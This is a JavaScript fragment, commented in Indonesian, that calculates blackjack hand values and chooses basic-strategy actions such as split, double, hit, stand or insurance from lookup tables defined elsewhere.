    function getCardValue(rank) {
        if (rank === 'J' || rank === 'Q' || rank === 'K') return 10;
        if (rank === 'A') return 11;
        return parseInt(rank, 10);
    }

    // Hitung nilai tangan (dengan soft handling)
    function calculateHandValue(cards) {
        if (!cards || cards.length === 0) return 0;
        let value = 0;
        let aces = 0;
        for (const card of cards) {
            const rank = card.rank;
            if (rank === 'J' || rank === 'Q' || rank === 'K') value += 10;
            else if (rank === 'A') { aces++; value += 11; }
            else value += parseInt(rank, 10);
        }
        while (value > 21 && aces > 0) {
            value -= 10;
            aces--;
        }
        return value;
    }

    // Tentukan aksi berdasarkan strategi perfect
    function getPerfectBlackjackDecision(playerHands, dealerHand, currentHandIndex, insuranceOffered, takeInsurance) {
        // Jika insurance ditawarkan
        if (insuranceOffered) {
            return takeInsurance ? "insurance" : "noInsurance";
        }

        const hand = playerHands[currentHandIndex];
        if (!hand) return "stand"; // fallback

        const playerCards = hand.cards;
        const playerActions = hand.actions || [];
        const playerValue = calculateHandValue(playerCards);
        const dealerUpcard = dealerHand.length > 0 ? dealerHand[0] : null;
        if (!dealerUpcard) return "stand";

        const dealerRank = dealerUpcard.rank;
        const dealerValue = getCardValue(dealerRank);

        // Cek apakah bisa split
        const isSplittable = playerCards.length === 2 && playerCards[0].rank === playerCards[1].rank;
        let splitDecision = 0; // 0=tidak split, 1=split, 2=double (khusus 5,5?)
        if (isSplittable && playerActions.includes('split')) {
            const rank = playerCards[0].rank;
            let index;
            if (rank === 'A') index = 9;
            else if (rank === 'K' || rank === 'Q' || rank === 'J' || rank === '10') index = 8;
            else index = parseInt(rank, 10) - 2; // 2->0, 3->1, ... 9->7
            if (index >= 0 && index < pairsTable.length) {
                splitDecision = pairsTable[index][dealerValue - 2] || 0;
            }
        }

        if (splitDecision === 1) {
            return "split";
        } else if (splitDecision === 2) {
            // Khusus 5,5 seharusnya double, tapi jika tidak bisa double, fallback ke hit?
            return playerActions.includes('double') ? "double" : "hit";
        }

        // Cek soft hand (ada As dan nilai soft <= 21)
        let isSoft = false;
        let softValue = 0;
        let aceCount = 0;
        for (const card of playerCards) {
            if (card.rank === 'A') aceCount++;
        }
        if (aceCount > 0) {
            // hitung nilai dengan As = 1 dulu
            let raw = 0;
            for (const card of playerCards) {
                raw += getCardValue(card.rank);
            }
            // jika ada As dan raw > 21, berarti soft
            if (raw > 21) {
                // sebenarnya ini hard karena As terpaksa jadi 1
                isSoft = false;
            } else {
                // hitung soft (As = 11)
                let soft = 0;
                for (const card of playerCards) {
                    if (card.rank === 'A') soft += 11;
                    else soft += getCardValue(card.rank);
                }
                if (soft <= 21) {
                    isSoft = true;
                    softValue = soft;
                }
            }
        }

        if (isSoft) {
            // softValue sudah termasuk As=11
            // softTable diindeks berdasarkan nilai soft dikurangi 3 (A,2 = 13? A,2 = 13? hitung: A=11 + 2=13 -> index 10? salah)
            // Di file: softTable baris untuk A,2 sampai A,9. A,2 total 13, A,3=14, ... A,9=20.
            // Jadi index = total - 13? A,2 total 13 -> index 0; A,3=14->1; ... A,9=20->7.
            let index = softValue - 13;
            if (index < 0) index = 0;
            if (index > 7) index = 7; // A,9 = 20 -> index 7
            const decision = softTable[index][dealerValue - 2];
            if (decision === 'D') {
                return (playerCards.length === 2 && playerActions.includes('double')) ? "double" : "hit";
            } else if (decision === 'Ds') {
                return (playerCards.length === 2 && playerActions.includes('double')) ? "double" : "stand";
            } else if (decision === 'H') {
                return "hit";
            } else if (decision === 'S') {
                return "stand";
            }
        } else {
            // Hard hand
            let index = playerValue - 8;
            if (index < 0) index = 0;
            if (index > 9) index = 9; // 17+ index 9
            const decision = hardTable[index][dealerValue - 2];
            if (decision === 'D') {
                return (playerCards.length === 2 && playerActions.includes('double')) ? "double" : "hit";
            } else if (decision === 'H') {
                return "hit";
            } else if (decision === 'S') {
                return "stand";
            }
        }

        return "stand"; // fallback
    }

